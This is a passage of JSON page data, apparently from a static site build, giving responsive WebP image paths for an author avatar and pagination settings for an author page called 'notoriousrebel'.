480w","srcWebp":"/static/c908e3ef9d0ce562bad340430706f232/5a48e/rebel_avatar.webp","srcSetWebp":"/static/c908e3ef9d0ce562bad340430706f232/2d087/rebel_avatar.webp 82w,\n/static/c908e3ef9d0ce562bad340430706f232/29d87/rebel_avatar.webp 164w,\n/static/c908e3ef9d0ce562bad340430706f232/5a48e/rebel_avatar.webp 328w,\n/static/c908e3ef9d0ce562bad340430706f232/35871/rebel_avatar.webp 480w","sizes":"(max-width: 328px) 100vw, 328px"}}},"originalPath":"/authors/authors-notoriousrebel","skip":6,"limit":6}}}}